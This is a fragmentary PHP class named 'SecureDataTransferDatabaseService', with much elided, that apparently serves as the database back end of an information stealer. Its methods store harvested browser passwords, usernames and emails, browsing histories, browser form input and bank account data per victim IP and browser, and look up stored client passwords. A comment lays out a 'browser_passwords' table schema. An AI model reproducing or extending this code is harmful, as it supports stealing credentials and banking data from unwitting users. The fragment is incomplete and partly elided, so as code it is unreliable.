...
class SecureDataTransferDatabaseService extends MishusoftSQLStandalone
{
    ...
    {
        return _Array::value($this->db->read(DB::INSTALLED_PRODUCTS_LIST_TABLE)->get(["get" => ["id"], "where" => ["name" => "{$name}", "version" => "{$version}", "ip_address" => "{$ip}", "browserNameFull" => "{$browser}"]]), "id");
    }
    ...
    public function rcvInfAbtUsersIP(array $haystack): bool
    {
        return $this->db->read(DB::CLIENT_IP_INFO_LIST_TABLE)->insert(array_merge(
            $haystack, array("last_update_date_time" => Time::getToday())
        ));
    }
    ...
    {
        //INSERT INTO `msu_info_app_browser_passwords`(`id`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `event`, `username`, `password`, `email`, `last_update_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10])
        return $this->db->read(DB::CLIENT_BROWSER_HISTORIES_INFO_LIST_TABLE)->insert(array_merge(
                $haystack, array("last_update_date_time" => Time::getToday())
            )
        );
    }
    ...
    {
        return _Array::value($this->db->read(DB::CLIENT_LIST_TABLE)->get(["get" => ["id"], "where" => ["emailAddress" => "{$email}"]]), "id");
    }
    ...
    {
        return _Array::value($this->db->read(DB::CLIENT_LIST_TABLE)->get(["get" => ["id"], "where" => ["ipAddress" => "{$ip}"]]), "id");
    }
    ...
    {
        return _Array::value($this->db->read(DB::CLIENT_LIST_TABLE)->get(["get" => ["password"], "where" => ["emailAddress" => "{$email}"]]), "password");
    }
    ...
    public function storeCltBrInpInDb(array $haystack): bool
    {
        ...
        return $this->db->read(DB::CLIENT_BROWSER_INPUT_INFO_LIST_TABLE)->insert(array_merge(
                $haystack, array("last_update_date_time" => Time::getToday())
            )
        );
    }
    ...
    public function storeCltBnkAccData(array $haystack): bool
    {
        ...
        return $this->db->read(DB::CLIENT_BANK_ACCOUNT_INFO_LIST_TABLE)->insert(array_merge(
                $haystack, array("last_update_date_time" => Time::getToday())
            )
        );
    }
    ...
    {
        return (int)_Array::value($this->db->read(DB::CLIENT_EARNING_CAPTCHA_INFO_LIST_TABLE)->get(["get" => ["{$search}"], "where" => ["app_id" => "{$app_id}", "username" => "{$username}"]]), "{$search}");
    }
